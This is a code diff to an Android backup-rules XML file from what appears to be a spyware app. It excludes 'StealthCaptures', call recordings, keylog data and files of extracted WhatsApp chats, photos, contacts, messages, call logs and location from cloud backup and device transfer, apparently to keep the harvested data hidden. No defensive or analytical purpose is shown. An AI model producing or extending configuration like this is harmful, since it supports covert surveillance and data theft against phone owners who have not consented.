@@ -1,15 +1,28 @@
 <?xml version="1.0" encoding="utf-8"?>
 <data-extraction-rules>
     <cloud-backup>
-        <!-- TODO: Use <include> and <exclude> to control what is backed up.
-        <include .../>
-        <exclude .../>
-        -->
+        <!-- Exclude sensitive data from cloud backups -->
+        <exclude domain="file" path="Recordings/" />
+        <exclude domain="file" path="extracted_photos/" />
+        <exclude domain="file" path="extracted_whatsapp/" />
+        <exclude domain="file" path="StealthCaptures/" />
+        <exclude domain="file" path="extracted_contacts.txt" />
+        <exclude domain="file" path="extracted_messages.txt" />
+        <exclude domain="file" path="extracted_call_logs.txt" />
+        <exclude domain="file" path="extracted_location.txt" />
+        <exclude domain="sharedpref" path="keylog_data" />
     </cloud-backup>
-    <!--
+
     <device-transfer>
-        <include .../>
-        <exclude .../>
+        <!-- Exclude sensitive data from device transfers -->
+        <exclude domain="file" path="Recordings/" />
+        <exclude domain="file" path="extracted_photos/" />
+        <exclude domain="file" path="extracted_whatsapp/" />
+        <exclude domain="file" path="StealthCaptures/" />
+        <exclude domain="file" path="extracted_contacts.txt" />
+        <exclude domain="file" path="extracted_messages.txt" />
+        <exclude domain="file" path="extracted_call_logs.txt" />
+        <exclude domain="file" path="extracted_location.txt" />
+        <exclude domain="sharedpref" path="keylog_data" />
     </device-transfer>
-    -->
 </data-extraction-rules>
